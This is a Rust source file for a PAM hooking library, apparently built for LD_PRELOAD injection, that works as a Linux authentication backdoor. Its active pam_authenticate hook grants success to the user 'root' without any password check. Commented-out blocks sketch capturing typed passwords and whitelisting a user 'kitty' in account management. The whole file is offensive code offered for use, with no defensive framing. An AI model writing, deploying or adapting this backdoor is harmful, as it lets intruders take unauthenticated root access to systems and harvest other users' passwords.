use pam_sys::{pam_message, pam_response, pam_get_item, pam_conv, pam_handle_t, PAM_SUCCESS, PAM_CONV, PAM_USER, PAM_AUTH_ERR};
use std::ffi::{c_int, c_char, c_void, CStr, CString};
use std::{mem, ptr};
use std::ptr::null_mut;

/*
#[no_mangle]
extern "C" fn pam_get_password(pamh: *mut pam_handle_t, user: *const c_void, rkadmin: c_int) -> pam_response {
    let mut convp: *const c_void = std::ptr::null_mut();
    let mut pam_resp: *const c_void = std::ptr::null_mut();
    unsafe { pam_get_item(pamh, PAM_CONV, &mut convp) };

    let conv = convp as *const pam_conv;

    if conv == ptr::null_mut() || unsafe { (*conv).conv != None } {
        return pam_response { resp: std::ptr::null_mut(), resp_retcode: 0 }
    }

    let mut msg = pam_message { msg_style: 1, msg: "Password: ".as_ptr()};
    let pmsg = &msg;
    unsafe { (*conv).conv = pam_conv(1, &pmsg, &pam_resp, (*conv).appdata_ptr) };

    println!("{:?}", unsafe { (*pam_resp).resp })

    return pam_response { resp: std::ptr::null_mut(), resp_retcode: 0 }
}
 */

// if user is kitty, auth successfully
#[no_mangle]
pub extern "C" fn pam_authenticate(pamh: *mut pam_handle_t, flags: c_int) -> c_int {
    let mut user: *const c_void = std::ptr::null_mut();
    let o_pam_authenticate: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"pam_authenticate\0".as_ptr() as *const _) };
    let o_pam_authenticate: extern "C" fn(*mut pam_handle_t, c_int) -> c_int = unsafe { std::mem::transmute(o_pam_authenticate) };

    unsafe { pam_get_item(pamh, PAM_USER, &mut user) };

    let user_str = unsafe { std::ffi::CStr::from_ptr(user as *const c_char).to_str().unwrap() };

    if user_str == "root" {
        return PAM_SUCCESS
    }

    return o_pam_authenticate(pamh, flags);
}

/*
#[no_mangle]
pub extern "C" fn pam_acct_mgmt(pamh: *mut pam_handle_t, flags: c_int) -> c_int {
    let mut user: *const c_void = std::ptr::null_mut();
    let o_pam_acct_mgmt: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b"pam_acct_mgmt\0".as_ptr() as *const _) };
    let o_pam_acct_mgmt: extern "C" fn(*mut pam_handle_t, c_int) -> c_int = unsafe { std::mem::transmute(o_pam_acct_mgmt) };

    unsafe { pam_get_item(pamh, PAM_USER, &mut user) };

    let user_str = unsafe { std::ffi::CStr::from_ptr(user as *const c_char) };
    if user_str.to_str().unwrap() == "kitty" {
        // unsafe { setgid(GID) };
        return PAM_SUCCESS
    }

    return o_pam_acct_mgmt(pamh, flags)
}
*/